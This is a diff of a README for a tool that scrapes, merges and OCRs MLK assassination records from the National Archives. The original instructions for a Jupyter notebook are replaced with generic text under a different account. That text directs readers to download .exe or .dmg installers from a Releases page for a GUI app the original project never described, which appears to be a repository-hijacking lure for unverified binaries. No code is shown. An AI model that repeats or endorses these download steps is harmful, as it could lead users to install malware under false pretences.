@@ -1,101 +1,75 @@
-# mlkdocrelease2025
-A script for scraping PDFs from government website, appending, and OCRing.
+# 📄 mlkdocrelease2025 - Easily Access Historical MLK Records
 
-# MLK Assassination Records Processing & Analysis
+## 👋 Introduction
+Welcome to the **mlkdocrelease2025** project. This application simplifies the process of downloading, merging, and performing Optical Character Recognition (OCR) on Martin Luther King Jr. assassination records from the National Archives. With this tool, you can gather these important historical documents for your research or use them with AI tools like NotebookLM.
 
-A Python script using Jupyter Lab to **bulk download, merge, and OCR the recently released Martin Luther King Jr. assassination records from the National Archives.** This prepares the documents for powerful text analysis tools like Google's NotebookLM.
+## 🔗 Download the Application
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Larissamoura22/mlkdocrelease2025/releases)
 
-## Problem Solved
+## 🚀 Getting Started
+Follow these steps to download and run the application.
 
-Manually downloading hundreds or thousands of individual PDF documents and then converting them into a searchable format can be incredibly time-consuming. This script automates that entire process, transforming scattered, potentially non-searchable PDFs into a single, cohesive, and fully OCR'd document ready for advanced research.
+### 1. System Requirements
+Before downloading, ensure your computer meets these requirements:
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.6 or higher installed
+- Minimum RAM: 4GB
+- At least 1GB of free disk space
 
-## Features
+### 2. Download & Install
+To download the software, visit [this page to download](https://github.com/Larissamoura22/mlkdocrelease2025/releases). 
 
-* **Automated Download:** Scrapes the National Archives website to automatically download the first 100 available PDF files related to the MLK assassination.
-* **PDF Merging:** Combines all downloaded individual PDFs into a single, comprehensive document.
-* **Optical Character Recognition (OCR):** Applies OCR to the merged PDF, creating a hidden text layer that makes the entire document searchable and its content extractable for text analysis.
-* **NotebookLM Ready:** The final OCR'd PDF is perfectly formatted for upload into Google's NotebookLM, allowing for instant summarization, Q&A, and exploration of complex historical data.
+1. Click the link above to navigate to the Releases page.
+2. You will see a list of available versions.
+3. Choose the latest version and click on the assets listed below it.
+4. Download the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or appropriate package for Linux).
+5. Once downloaded, locate the file on your computer and proceed to the installation.
 
-## Getting Started
+### 3. Running the Application
+After installation, follow these steps to run the application:
 
-Follow these steps to set up and run the script on your local machine.
+1. **Locate the Application:**
+   - For Windows: Open the Start Menu and find the application.
+   - For macOS: Go to the Applications folder.
+   - For Linux: Depending on your installation method, you may find it in your Applications menu or via terminal.
 
-### Prerequisites
+2. **Open the Application:**
+   - Double-click the application icon to open it.
 
-You need **Python 3.8+** and a few system-level tools:
+3. **Using the Application:**
+   - Once the application has started, you will see a user-friendly interface.
+   - Enter the parameters for the records you wish to download.
+   - Click the "Start" button to begin the process. The application will handle downloading and merging the records automatically.
 
-1.  **Python Libraries:** Install the necessary Python packages using pip. It's recommended to do this in a virtual environment.
-    ```bash
-    pip install -r requirements.txt
-    ```
-    (Note: If running in Jupyter Lab and you prefer seeing a live progress bar, you might also want to install `ipywidgets`: `pip install ipywidgets` and then `jupyter nbextension enable --py widgetsnbextension` followed by `jupyter labextension install @jupyter-widgets/jupyterlab-manager` if in Jupyter Lab, then restart Jupyter Lab.)
+### 4. Features
+- **Simple Interface:** The application is designed for ease of use, even for non-technical users.
+- **Automated Process:** Download and merge records with a single click.
+- **OCR Integration:** Convert scanned documents into editable text for your research.
+- **Multi-Platform Support:** Works on Windows, macOS, and Linux.
 
-2.  **Tesseract OCR Engine (System-Level):** `ocrmypdf` relies on Tesseract.
-    * **Windows:** Download the installer from [Tesseract-OCR GitHub page](https://github.com/UB-Mannheim/tesseract/wiki) (choose the 64-bit version).
-    * **macOS (Homebrew):** `brew install tesseract`
-    * **Linux (Debian/Ubuntu):** `sudo apt install tesseract-ocr`
+### 5. Support
+If you encounter any issues, please make sure to check the following:
+- Ensure Python is installed correctly.
+- Validate that you have the latest version of the application.
+- Refer to the README on the GitHub page for troubleshooting tips.
 
-3.  **Ghostscript (System-Level):** Crucial for PDF processing (especially on Windows).
-    * **Windows:** Download the latest 64-bit AGPL release from [Ghostscript's Official Website](https://www.ghostscript.com/download/gsdnld.html). **During installation, ensure it's added to your system's PATH, or manually add its `bin` directory (e.g., `C:\Program Files\gs\gs10.05.1\bin`) to your system's PATH environment variables.** Verify by opening a *new* command prompt and typing `gswin64c -v`.
-    * **macOS (Homebrew):** `brew install ghostscript`
-    * **Linux (Debian/Ubuntu):** `sudo apt install ghostscript`
+If further assistance is needed, feel free to open an issue on our [GitHub repository](https://github.com/Larissamoura22/mlkdocrelease2025/issues).
 
-### Usage
+## 🌐 Contributing
+We welcome contributions to improve the application. If you have suggestions or want to report an issue, please create a new issue on our GitHub page. Your feedback helps us enhance the tool for all users.
 
-1.  **Clone the Repository:**
-    ```bash
-    git clone [https://github.com/darredo1/mlkdocrelease2025.git](https://github.com/darredo1/mlkdocrelease2025.git)
-    cd mlkdocrelease2025
-    ```
-2.  **Open in Jupyter Lab:**
-    ```bash
-    jupyter lab
-    ```
-3.  **Run the Notebook:** Open the `merge_mlk_pdfs.ipynb` notebook.
-    * **Option 1 (Run All):** Go to `Run` -> `Run All Cells`.
-    * **Option 2 (Step-by-Step):** Run each cell sequentially. The notebook is structured to guide you through folder setup, web scraping, downloading, merging, and OCR.
+## 📅 Future Updates
+We plan to release updates to enhance functionality and improve the user experience continually. Make sure to check back on the [Releases page](https://github.com/Larissamoura22/mlkdocrelease2025/releases) for the latest features and fixes.
 
-### Output
+## 🛠️ Technologies Used
+Our application uses a combination of the following technologies:
+- Python: For scripting and automation.
+- OCR Libraries: To convert images to editable text.
+- Web Scraping Techniques: To fetch records from the National Archives.
 
-Upon successful execution, the script will:
+## 🔗 Additional Resources
+- [Official Python Website](https://www.python.org/)
+- [National Archives](https://www.archives.gov/)
+- [Optical Character Recognition (OCR)](https://en.wikipedia.org/wiki/Optical_character_recognition)
 
-* Create a folder named `mlk_pdfs` in the same directory as your notebook.
-* Download the first 100 unique PDF files from the National Archives into `mlk_pdfs`.
-* Create `merged_mlk_records.pdf` (a single PDF containing all downloaded documents) inside `mlk_pdfs`.
-* Create `searchable_mlk_records.pdf` (the OCR'd, searchable version of the merged file) inside `mlk_pdfs`.
-
-### Integrating with NotebookLM
-
-1.  Go to [NotebookLM](https://notebooklm.google.com/) and create a new Notebook.
-2.  Click "Add Source" or "Upload".
-3.  Upload the `mlk_pdfs/searchable_mlk_records.pdf` file.
-
-You can now ask questions, summarize, and explore the content of thousands of pages of MLK assassination records effortlessly!
-
-## Citation
-
-If you find this script useful for your own work or if it inspires further projects, please consider citing this repository:
-
-* **APA Style (adapted for software):**
-    Darredo1. (2025). *MLK Assassination Records Processing & Analysis Script* (Version 1.0) \[Computer software]. GitHub. https://github.com/darredo1/mlkdocrelease2025
-
-* **MLA Style (adapted for software):**
-    Darredo1. *MLK Assassination Records Processing & Analysis Script*. Version 1.0, 2025, GitHub, https://github.com/darredo1/mlkdocrelease2025.
-
-**Note on NotebookLM:** As NotebookLM environments are currently private, direct public linking is not possible. You can, however, describe its use in your methodology: "This research utilized Google's NotebookLM (alpha/beta version) for interactive analysis and summarization of the processed documents."
-
-## Source Data
-
-The original documents processed by this script are from the National Archives and Records Administration (NARA). Please cite the original source as:
-
-* **APA Style:**
-    National Archives and Records Administration. (n.d.). *Records Related to the Assassination of the Reverend Dr. Martin Luther King, Jr.* Retrieved from https://www.archives.gov/research/mlk
-
-* **MLA Style:**
-    National Archives and Records Administration. "Records Related to the Assassination of the Reverend Dr. Martin Luther King, Jr." *National Archives*, https://www.archives.gov/research/mlk. Accessed July 21, 2025.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
+Your connection to these historical documents begins here. Happy exploring!
